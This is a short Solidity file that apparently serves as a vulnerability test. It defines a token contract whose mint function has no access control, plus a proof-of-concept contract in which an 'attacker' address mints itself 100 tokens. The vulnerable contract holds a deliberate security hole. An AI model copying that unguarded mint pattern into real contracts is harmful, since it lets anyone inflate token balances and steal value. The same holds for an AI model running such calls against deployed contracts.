// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

contract PublicMintVictim {
    mapping(address => uint256) public balanceOf;

    function mint(address recipient, uint256 amount) external {
        balanceOf[recipient] += amount;
    }
}

contract PublicMintPoC {
    function testPoC_AnyoneCanMint() external {
        PublicMintVictim victim = new PublicMintVictim();
        address attacker = address(0xBEEF);
        (bool success, ) = address(victim).call(
            abi.encodeWithSignature("mint(address,uint256)", attacker, 100)
        );
        require(success, "public mint call failed");
        require(victim.balanceOf(attacker) == 100, "attacker could not mint");
    }
}
